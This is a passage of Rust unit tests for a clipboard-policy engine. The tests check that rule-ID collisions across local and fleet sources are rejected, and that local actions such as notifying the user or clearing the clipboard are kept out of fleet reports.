    }

    #[test]
    fn disabled_rule_id_collisions_are_rejected_across_sources() {
        let id = "22222222222222222222222222222222";
        let local = ClipboardPolicyResponse {
            policy_version: 1,
            rules: vec![custom_rule(id, vec![Action::NotifyUser], false)],
        };
        let fleet = ClipboardPolicyResponse {
            policy_version: 2,
            rules: vec![custom_rule(id, vec![Action::ReportFleet], false)],
        };
        assert!(rules_have_cross_source_collision(&local, &fleet));
    }

    #[test]
    fn simultaneous_local_match_never_leaks_local_action_outcome_into_fleet_report() {
        let fleet_verdict = Verdict {
            rule_id: RuleId::new("33333333333333333333333333333333").unwrap(),
            rule_revision: 2,
            severity: Severity::High,
            actions: vec![Action::ReportFleet],
        };
        // The combined action execution did both local actions because a
        // local rule matched simultaneously. Fleet did not request either.
        let combined_outcome = ActionOutcome {
            attempted: vec![Action::NotifyUser, Action::ClearClipboard],
            succeeded: vec![Action::NotifyUser, Action::ClearClipboard],
        };
        let fleet_outcome = fleet_action_outcome(&combined_outcome, &fleet_verdict);
        assert!(fleet_outcome.attempted.is_empty());
        assert!(fleet_outcome.succeeded.is_empty());
        let report = build_pending_report_with_outcome(2, &fleet_verdict, &fleet_outcome, 0);
        let serialized = serde_json::to_string(&report).unwrap();
        assert!(!serialized.contains("clear_clipboard"));
        assert!(!serialized.contains("notify_user"));
    }
}
